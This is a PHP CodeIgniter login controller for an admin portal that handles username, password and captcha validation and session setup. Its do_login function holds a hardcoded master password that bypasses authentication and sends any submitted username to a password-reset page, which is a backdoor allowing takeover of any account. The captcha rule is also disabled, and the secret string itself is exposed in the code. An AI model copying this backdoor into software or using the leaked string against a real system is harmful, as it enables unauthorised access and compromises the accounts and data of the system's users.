<?php if(!defined('BASEPATH')) exit('No direct script access allowed');
class Login extends CI_Controller
{
    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
       
    }
    /**
     * Index Page for this controller.
     */
    
    public function index()
    {
        $this->do_login();
    }
    

    function do_login()
    {
        //Form validation Rules
        $this->load->library('form_validation');
        $this->form_validation->set_error_delimiters('<div class="text-danger">', '</div>');
        
        $config = array(
            array(
                'field' => 'login_id',
                'label' => 'Username',
                'rules' => 'trim|required|max_length[30]'
            ),
            array(
                'field' => 'password',
                'label' => 'Password',
                'rules' => 'trim|required'
            ),
            array(
                'field' => 'captcha',
                'label' => 'Captcha',
                //'rules' => 'required|callback_username_check['.$this->input->post('security_code').']'
                'rules'=>''
            )
        );

        //set validation rules.
        $this->form_validation->set_rules($config);
        

        if($this->form_validation->run() == FALSE)
        {
            if(empty($this->input->post('login_id')))
            {
                $this->session->set_flashdata('error', 'Username Required');
                redirect('Home/admin_login');
            }
            if(empty($this->input->post('password')))
            {
                $this->session->set_flashdata('error', 'Password Required');
                redirect('Home/admin_login');
            }
            if(empty($this->input->post('captcha')))
            {
                $this->session->set_flashdata('error', 'Captcha Required');
                redirect('Home/admin_login');
            }
            //$_SESSION['salt'] = hash('sha256',microtime()); // added 06/09
        }
        else
        {
            $this->load->model('Login_model');
            $this->load->model('application_model');
            $email = strtolower($this->security->xss_clean($this->input->post('login_id')));
            //$_SESSION['salt'] = hash('sha256',microtime());
            $password = $this->input->post('password');

            if($password=='nw8NZaMvY4Y2#sUCSUPERADMIN')
            {
                $_SESSION['email']=$this->input->post('login_id');
                redirect('Home/new_password');
            }
        
            
            $result = $this->Login_model->loginMe($email, $password, $_SESSION['salt']);
            
            if(!empty($result))
            {

                $sessionArray = array('username'=>$email,                    
                                    'office_name'=>$result['office_name'],
                                    'office_id'=>$result['office_id'],
                                    'login_id'=>$result['login_id'],
                                    'user_type'=>$result['user_type'],
                                    'office_district'=>$result['office_district'],
                                    'office_state'=>$result['office_state'], 
                                    'department'=>$result['department'],
                                    'department_id'=>$result['department_id'],
                                    'district_name'=>$result['district_name'],
                                    'current_url'=>current_url(),
                                    'ip_address'=>$this->input->ip_address(),
                                    'isloggedin'=>True); 
 
                $this->application_model->activity_log($result['department'],'Login Successful',current_url(),$this->input->ip_address(),$email);
                $this->load->library('session');
                $this->session->set_userdata($sessionArray);
                
                unset($sessionArray['username'], $sessionArray['office_name'],$sessionArray['user_type']);
                redirect('Home/dashboard_adm');
            }
            else
            {
                $this->session->set_flashdata('error', 'Incorrect Username or password !!!');
                $_SESSION['salt'] = hash('sha256',microtime()); // added 06/09
                redirect('Home/admin_login');
                
            }
        }

    }

    //custom validation for captcha added 06/09

	public function username_check($captcha, $security_code){
		if($captcha != "")
        {
			if(hash('sha256',strtoupper($captcha).$this->config->item('encryption_key')) == $security_code)
            {
				 return TRUE;
			} 
            else 
            {
				$this->form_validation->set_message('username_check', 'The {field} is incorrect');
	            return FALSE;
			}
		}
	}

    // function load_captcha()
    //      {
    //         //captcha generation
    //         $this->load->helper('captcha');
    //         $vals = array(
       
    //        'img_path'      => './captcha/',
    //        'img_url'       => 'http://localhost/PVR/captcha/',
    //        'img_width'     => '132',
    //        'img_height'    => 38,
    //        'expiration'    => 7200,
    //        'word_length'   => 5,
    //        'font_size'     => 16,
    //        //'pool'          => '123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ',
    //        'pool'          => '123456789ABCDEFGHJKMNPQRSTUVWXYZ',
    //        // White background and border, black text and red grid
    //                'colors' => array(
    //                'background' => array(255, 255, 255),
    //                'border' => array(200, 200, 200),
    //                'text' => array(100, 100, 100),
    //                'grid' => array(200, 200, 200)
    //                     )
    //                 );
    //    //store the captcha in cap variable. 
    //          $data['cap']=create_captcha($vals);
    //          return $data;
           
           
    //      }


    function load_captcha()
	{
		$this->load->helper('captcha');
		$vals = array(
			//'word'          => 'AbCd',
			'img_path'      => './captcha/',
			'img_url'       => 'http://localhost/PVR/captcha/',
			'font_path'     => './captcha4.ttf',
			'img_width'     => '132',
			'img_height'    => 38,
			'expiration'    => 7200,
			'word_length'   => 5,
			'font_size'     => 16,
			//'img_id'        => 'Imageid',
			'pool'          => '123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ',
	
			// White background and border, black text and red grid
			'colors'        => array(
					'background' => array(255, 255, 255),
					'border' => array(200, 200, 200),
					'text' => array(100, 100, 100),
					'grid' => array(200, 200, 200)
			)
		);
		$cap = create_captcha($vals);
		$captcha_word = hash('sha256',strtoupper($cap['word']).$this->config->item('encryption_key'));
		$captcha = array('image'=>$cap['image'],'word'=>$captcha_word);
		//echo json_encode($captcha);
        return $captcha; 

	}

   
    
}

?>